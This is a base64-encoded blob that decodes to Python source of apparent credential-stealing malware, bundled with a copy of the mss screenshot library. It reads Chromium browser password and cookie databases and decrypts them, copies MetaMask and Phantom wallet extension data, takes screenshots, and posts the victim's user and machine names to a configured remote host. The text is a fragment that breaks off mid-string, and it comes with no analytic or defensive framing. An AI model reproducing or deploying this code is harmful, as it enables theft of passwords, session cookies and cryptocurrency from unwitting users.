X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidMb2dpbiBEYXRhIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dzLmFwcGVuZCgocm93WzFdLCByb3dbM10sIHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMVx4OGYsIHtlfScpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtwfSwgXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcblxyXG4gICAgICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIHBhc3N3b3Jkc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdwYXNzd29yZHMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2RpcihwYXNzd29yZHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZidVUkw6IHt1cmx9XFxuTG9naW46IHtsb2dpbn1cXG5QYXNzd29yZDoge3Bhc3N3b3JkfVxcblxcbicpXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX3Bhc3N3b3JkOiB7ZX0nKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICAgICAgY29va2llX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBfb25seSA9IGNvbnYocm93WzldKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uX2RhdGUgPSBzdHIocm93WzddKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGIwLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdmFsdWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGhvc3QsIGh0dHBfb25seSwgcGF0aCwgc2VjdXJlLCBleHBpcmF0aW9uX2RhdGUsIG5hbWUsIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfY29va2llczoge2V9JylcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3dhbGxldHMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICB3YWxsZXRzID0ge1xyXG4gICAgICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgICAgIHdhbGxldF9uYW1lID0gd2FsbGV0c1tuYW1lXVxyXG4gICAgICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHAsIGRlc3RfcGF0aClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDFceDhjIFx4ZDFceDgxIHtwfScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmEge3Jvb3RfcGF0aH0nKVxyXG4gICAgXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBjaHJvbWl1bV9icm93c2VyX25hbWVzID0ge1xyXG4gICAgICAgICAgICAnb3BlcmEgZ3ggc3RhYmxlJyxcclxuICAgICAgICAgICAgJ29wZXJhIHN0YWJsZScsXHJcbiAgICAgICAgICAgICdjaHJvbWUnLFxyXG4gICAgICAgICAgICAneWFuZGV4YnJvd3NlcidcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRhc2tzOiBMaXN0W1Rhc2tdID0gW11cclxuXHJcbiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIocGF0aCkpOlxyXG4gICAgICAgICAgICByb290X3BhdGggPSBqb2luKHBhdGgsIGZvbGRlcl9uYW1lKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9wYXNzd29yZChyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfY29va2llcyhyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfd2FsbGV0cyhyb290X3BhdGgpKSlcclxuXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgc2VsZi5jb25mLmxvZ2dlcikpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gY2hyb21pdW0gdGFza3M6IHtlfScpXHJcbiAgICAgICAgICAgICAgICAiKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgncGx1Z2lucy9kZXRhaWxzLnB5JywgYiJmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5pbXBvcnQgcGxhdGZvcm1cclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5mcm9tIG1zcy53aW5kb3dzIGltcG9ydCBNU1MgYXMgbXNzXHJcbmZyb20gdG9vbHMgaW1wb3J0IG1vdmVcclxuXHJcblxyXG5cclxuY2xhc3MgRGV0YWlscygpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIHRha2Vfc2NyZWVuc2hvdChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHdpdGggbXNzKCkgYXMgc2N0OlxyXG4gICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gc2N0LnNhdmUoKTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IG1vdmUoZmlsZW5hbWUsIGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBmaWxlbmFtZSkpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceGExXHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmRceGQxXHg4OFx4ZDBceGJlXHhkMVx4ODIge2ZpbGVuYW1lfSBceGQxXHg4MVx4ZDBceGJlXHhkMVx4ODVceGQxXHg4MFx4ZDBceGIwXHhkMFx4YmRceGQwXHhiNVx4ZDBceGJkJylcclxuIFxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgYmdfdGFzayA9IGNyZWF0ZV90YXNrKHNlbGYudGFrZV9zY3JlZW5zaG90KCkpXHJcbiAgICAgICAgdXNlciA9IG9zLmdldGxvZ2luKClcclxuICAgICAgICBwYyA9IHBsYXRmb3JtLm5vZGUoKVxyXG4gICAgICAgIHRhZyA9IHNlbGYuY29uZi50YWdcclxuXHJcbiAgICAgICAgZGF0YSA9IHtcclxuICAgICAgICAgICAgJ2NsaWVudF9pZCc6IHNlbGYuY29uZi5jbGllbnRfaWQsXHJcbiAgICAgICAgICAgICd0YWcnOiB0YWcsXHJcbiAgICAgICAgICAgICd1c2VyX25hbWUnOiB1c2VyLFxyXG4gICAgICAgICAgICAncGNfbmFtZSc6IHBjXHJcbiAgICAgICAgfVxyXG4gICAgICAgIFxyXG4gICAgICAgIHVybCA9IGYne3NlbGYuY29uZi5ob3N0fS9yZWNlaXZlX2RldGFpbHMnXHJcblxyXG4gICAgICAgIHJlc3AgPSBhd2FpdCBzZWxmLmNvbmYuc2Vzc2lvbi5wb3N0KHVybCwganNvbj1kYXRhKVxyXG5cclxuICAgICAgICBhc3luYyB3aXRoIG9wZW4oam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdkZXRhaWxzLnR4dCcpLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmJ3VzZXIgbmFtZToge3VzZXJ9XFxucGMgbmFtZToge3BjfVxcbnRhZzoge3RhZ30nKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODJceGQxXHg4MVx4ZDFceDgyXHhkMVx4ODNceGQwXHhiYSBceGQwXHhiZVx4ZDFceDgyXHhkMFx4YmZceGQxXHg4MFx4ZDBceGIwXHhkMFx4YjJceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmQnKVxyXG5cclxuICAgICAgICBhd2FpdCBiZ190YXNrIikKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ21zcy9fX2luaXRfXy5weScsIGInIiIiXG5BbiB1bHRyYSBmYXN0IGNyb3NzLXBsYXRmb3JtIG11bHRpcGxlIHNjcmVlbnNob3RzIG1vZHVsZSBpbiBwdXJlIHB5dGhvblxudXNpbmcgY3R5cGVzLlxuXG5UaGlzIG1vZHVsZSBpcyBtYWludGFpbmVkIGJ5IE1pY2thXHhjM1x4YWJsIFNjaG9lbnRnZW4gPGNvbnRhY3RAdGlnZXItMjIyLmZyPi5cblxuWW91IGNhbiBhbHdheXMgZ2V0IHRoZSBsYXRlc3QgdmVyc2lvbiBvZiB0aGlzIG1vZHVsZSBhdDpcbiAgICBodHRwczovL2dpdGh1Yi5jb20vQm9ib1RpRy9weXRob24tbXNzXG5JZiB0aGF0IFVSTCBzaG91bGQgZmFpbCwgdHJ5IGNvbnRhY3RpbmcgdGhlIGF1dGhvci5cbiIiIlxuXG5mcm9tIC5leGNlcHRpb24gaW1wb3J0IFNjcmVlblNob3RFcnJvclxuZnJvbSAuZmFjdG9yeSBpbXBvcnQgbXNzXG5cbl9fdmVyc2lvbl9fID0gIjYuMS4wIlxuX19hdXRob3JfXyA9ICJNaWNrYVx4YzNceGFibCBcJ1RpZ2VyLTIyMlwnIFNjaG9lbnRnZW4iXG5fX2NvcHlyaWdodF9fID0gIiIiXG4gICAgQ29weXJpZ2h0IChjKSAyMDEzLTIwMjAsIE1pY2thXHhjM1x4YWJsIFwnVGlnZXItMjIyXCcgU2Nob2VudGdlblxuXG4gICAgUGVybWlzc2lvbiB0byB1c2UsIGNvcHksIG1vZGlmeSwgYW5kIGRpc3RyaWJ1dGUgdGhpcyBzb2Z0d2FyZSBhbmQgaXRzXG4gICAgZG9jdW1lbnRhdGlvbiBmb3IgYW55IHB1cnBvc2UgYW5kIHdpdGhvdXQgZmVlIG9yIHJveWFsdHkgaXMgaGVyZWJ5XG4gICAgZ3JhbnRlZCwgcHJvdmlkZWQgdGhhdCB0aGUgYWJvdmUgY29weXJpZ2h0IG5vdGljZSBhcHBlYXIgaW4gYWxsIGNvcGllc1xuICAgIGFuZCB0aGF0IGJvdGggdGhhdCBjb3B5cmlnaHQgbm90aWNlIGFuZCB0aGlzIHBlcm1pc3Npb24gbm90aWNlIGFwcGVhclxuICAgIGluIHN1cHBvcnRpbmcgZG9jdW1lbnRhdGlvbiBvciBwb3J0aW9ucyB0aGVyZW9mLCBpbmNsdWRpbmdcbiAgICBtb2RpZmljYXRpb25zLCB0aGF0IHlvdSBtYWtlLlxuIiIiXG5fX2FsbF9fID0gKCJTY3JlZW5TaG90RXJyb3IiLCAibXNzIilcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtc3MvZXhjZXB0aW9uLnB5JywgYiciIiJcblRoaXMgaXMgcGFydCBvZiB0aGUgTVNTIFB5dGhvblwncyBtb2R1bGUuXG5Tb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9Cb2JvVGlHL3B5dGhvbi1tc3NcbiIiIlxuXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lOR1xuXG5pZiBUWVBFX0NIRUNLSU5HOlxuICAgIGZyb20gdHlwaW5nIGltcG9ydCBBbnksIERpY3QgICMgbm9xYVxuXG5cbmNsYXNzIFNjcmVlblNob3RFcnJvcihFeGNlcHRpb24pOlxuICAgICIiIiBFcnJvciBoYW5kbGluZyBjbGFzcy4gIiIiXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgbWVzc2FnZSwgZGV0YWlscz1Ob25lKTpcbiAgICAgICAgIyB0eXBlOiAoc3RyLCBEaWN0W3N0ciwgQW55XSkgLT4gTm9uZVxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKG1lc3NhZ2UpXG4gICAgICAgIHNlbGYuZGV0YWlscyA9IGRldGFpbHMgb3Ige31cbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdtc3MvZmFjdG9yeS5weScsIGInIiIiXG5UaGlzIGlzIHBhcnQgb2YgdGhlIE1TUyBQeXRob25cJ3MgbW9kdWxlLlxuU291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vQm9ib1RpRy9weXRob24tbXNzXG4iIiJcblxuaW1wb3J0IHBsYXRmb3JtXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lOR1xuXG5mcm9tIC5leGNlcHRpb24gaW1wb3J0IFNjcmVlblNob3RFcnJvclxuXG5cbmlmIFRZUEVfQ0hFQ0tJTkc6XG4gICAgZnJvbSB0eXBpbmcgaW1wb3J0IEFueSAgIyBub3FhXG5cbiAgICBmcm9tIC5iYXNlIGltcG9ydCBNU1NCYXNlICAjIG5vcWFcblxuXG5kZWYgbXNzKCoqa3dhcmdzKTpcbiAgICAjIHR5cGU6IChBbnkpIC0+IE1TU0Jhc2VcbiAgICAiIiIgRmFjdG9yeSByZXR1cm5pbmcgYSBwcm9wZXIgTVNTIGNsYXNzIGluc3RhbmNlLlxuXG4gICAgICAgIEl0IGRldGVjdHMgdGhlIHBsYXRlZm9ybSB3ZSBhcmUgcnVubmluZyBvblxuICAgICAgICBhbmQgY2hvb3NlIHRoZSBtb3N0IGFkYXB0ZWQgbXNzX2NsYXNzIHRvIHRha2VcbiAgICAgICAgc2NyZWVuc2hvdHMuXG5cbiAgICAgICAgSXQgdGhlbiBwcm94aWVzIGl0cyBhcmd1bWVudHMgdG8gdGhlIGNsYXNzIGZvclxuICAgICAgICBpbnN0YW50aWF0aW9uLlxuICAgICIiIlxuICAgICMgcHlsaW50OiBkaXNhYmxlPWltcG9ydC1vdXRzaWRlLXRvcGxldmVsXG5cbiAgICBvc18gPSBwbGF0Zm9ybS5zeXN0ZW0oKS5sb3dlcigpXG5cbiAgICBpZiBvc18gPT0g